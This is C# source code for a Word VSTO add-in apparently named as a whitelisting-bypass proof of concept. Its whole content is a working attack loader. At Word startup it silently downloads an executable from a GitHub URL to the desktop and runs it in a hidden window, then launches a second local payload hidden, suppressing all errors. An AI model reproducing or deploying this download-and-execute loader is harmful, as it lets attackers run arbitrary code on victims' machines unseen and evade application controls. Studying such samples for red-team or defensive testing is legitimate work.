using System;
using System.IO;
using System.Net;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml.Linq;
using Word = Microsoft.Office.Interop.Word;
using Office = Microsoft.Office.Core;
using Microsoft.Office.Tools.Word;

namespace Vsto400Bypass
{
    public partial class ThisAddIn
    {
        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            string remoteUri = "https://raw.githubusercontent.com/NotSurprised/LoremIpsumDolorSitAmetconsEctetur/master/Payload/Vsto400Bypass/Vsto400BypassOnlinePayload.exe";
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string fileName = "\\Vsto400BypassOnlinePayloadDownloaded.exe", myStringWebResource = null;
            string downloadPath = path + fileName;
            // Create a new WebClient instance.
            WebClient myWebClient = new WebClient();
            try
            {
                string title = "Vsto400Bypass";
                string message = "Download path:" + downloadPath;
                //MessageBox.Show(message, title);
                // Download the Web resource and save it into the current filesystem folder.
                myWebClient.DownloadFile(remoteUri, downloadPath);
                System.Diagnostics.Process process = new System.Diagnostics.Process();
            }
            catch
            {
            }
            System.Diagnostics.Process processA = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoA = new System.Diagnostics.ProcessStartInfo();
            startInfoA.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoA.FileName = downloadPath;
            processA.StartInfo = startInfoA;
            try
            {
                processA.Start();
            }
            catch
            {
            }

            string localPath = path + "\\Vsto400BypassOfflinePayload.exe";
            System.Diagnostics.Process processB = new System.Diagnostics.Process();
            System.Diagnostics.ProcessStartInfo startInfoB = new System.Diagnostics.ProcessStartInfo();
            startInfoB.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            startInfoB.FileName = localPath;
            processB.StartInfo = startInfoB;
            try
            {
                string title = "Vsto400Bypass";
                string message = "Local path:" + localPath;
                //MessageBox.Show(message, title);
                processB.Start();
            }
            catch
            {
            }

            string filename = "/WLtester.txt";
            path += filename;
            using (FileStream file = File.Exists(path) ? File.Open(path, FileMode.Append) : File.Open(path, FileMode.CreateNew))
            {
                using (StreamWriter stream = new StreamWriter(file))
                {
                    stream.WriteLine("Vsto400Bypass.");
                }
            }
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
        }

        #region VSTO 產生的程式碼

        /// <summary>
        /// 此為設計工具支援所需的方法 - 請勿使用程式碼編輯器修改
        /// 這個方法的內容。
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }
        
        #endregion
    }
}
